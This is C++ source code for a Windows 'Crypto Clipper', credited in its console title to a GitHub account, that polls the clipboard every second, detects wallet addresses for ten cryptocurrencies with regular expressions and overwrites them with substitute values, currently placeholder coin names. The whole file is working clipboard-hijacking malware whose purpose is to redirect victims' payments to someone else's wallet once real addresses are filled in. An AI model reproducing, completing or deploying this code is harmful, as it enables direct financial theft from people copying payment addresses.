#include <iostream>
#include <string>
#include <chrono>
#include <thread>
#include <windows.h>
#include <regex>
#include <algorithm>
#include <map>

using namespace std;

const map<string, map<string, string>> addresses = {
    {"Monero", {{"regex", "(?:^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$)"}, {"message", "Monero address detected in clipboard!"}, {"new", "Monero"}}},
    {"Litecoin", {{"regex", "^(([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})|M[a-km-zA-HJ-NP-Z1-9]{26,33})$"}, {"message", "Litecoin address detected in clipboard!"}, {"new", "Litecoin"}}},
    {"Bitcoin", {{"regex", "^((bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39})$"}, {"message", "Bitcoin address detected in clipboard!"}, {"new", "Bitcoin"}}},
    {"Ethereum", {{"regex", "(0x[a-fA-F0-9]{40})"}, {"message", "Ethereum address detected in clipboard!"}, {"new", "Ethereum"}}},
    {"Stellar", {{"regex", "(?:^G[0-9a-zA-Z]{55}$)"}, {"message", "Stellar address detected in clipboard!"}, {"new", "Stellar"}}},
    {"XRP", {{"regex", "(?:^r[0-9a-zA-Z]{24,34}$)"}, {"message", "XRP address detected in clipboard!"}, {"new", "XRP"}}},
    {"Bitcoin Cash", {{"regex", "^((bitcoincash:)?(q|p)[a-z0-9]{41})"}, {"message", "Bitcoin Cash address detected in clipboard!"}, {"new", "Bitcoin Cash"}}},
    {"Dogecoin", {{"regex", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$"}, {"message", "Dogecoin address detected in clipboard!"}, {"new", "Dogecoin"}}},
    {"Dash", {{"regex", "(?:^X[1-9A-HJ-NP-Za-km-z]{33}$)"}, {"message", "Dash address detected in clipboard!"}, {"new", "Dash"}}},
    {"NEO", {{"regex", "(?:^A[0-9a-zA-Z]{33}$)"}, {"message", "NEO address detected in clipboard!"}, {"new", "NEO"}}}};

string getClipboardContent()
{
  string content;
  if (OpenClipboard(NULL))
  {
    HANDLE clipboardData = GetClipboardData(CF_TEXT);
    if (clipboardData != NULL)
    {
      char *clipboardText = static_cast<char *>(GlobalLock(clipboardData));
      if (clipboardText != NULL)
      {
        content = clipboardText;
        GlobalUnlock(clipboardData);
      }
    }
    CloseClipboard();
  }
  return content;
}

void setClipboardContent(const string &content)
{
  if (content.empty())
  {
    return;
  }
  if (OpenClipboard(NULL))
  {
    EmptyClipboard();
    HGLOBAL clipbuffer = GlobalAlloc(GMEM_DDESHARE, content.size() + 1);
    if (clipbuffer != NULL)
    {
      char *buffer = static_cast<char *>(GlobalLock(clipbuffer));
      if (buffer != NULL)
      {
        strcpy_s(buffer, content.size() + 1, content.c_str());
        GlobalUnlock(clipbuffer);
        SetClipboardData(CF_TEXT, clipbuffer);
      }
    }
    CloseClipboard();
  }
}

void monitorClipboard()
{
  string prevContent = getClipboardContent();

  while (true)
  {
    string currentContent = getClipboardContent();

    if (currentContent != prevContent)
    {
      prevContent = currentContent;
      const auto sortedKeys = {"Monero", "Litecoin", "Bitcoin", "Ethereum", "Stellar", "XRP", "Bitcoin Cash", "Dogecoin", "Dash", "NEO"};

      for (const auto &key : sortedKeys)
      {
        const std::regex &regexObj = std::regex(addresses.at(key).at("regex"));
        if (std::regex_search(currentContent, regexObj))
        {
          const std::string &newAddress = addresses.at(key).at("new");
          const std::string newContent = std::regex_replace(currentContent, regexObj, newAddress);
          std::cout << addresses.at(key).at("message") << " Replacing " << currentContent << " with " << newContent << std::endl;
          setClipboardContent(newContent);
          break;
        }
      }
    }

    this_thread::sleep_for(chrono::milliseconds(1000));
  }
}

int main()
{
    SetConsoleTitle(TEXT("Crypto Clipper by github.com/opsec-bot"));
    monitorClipboard();
    return 0;
}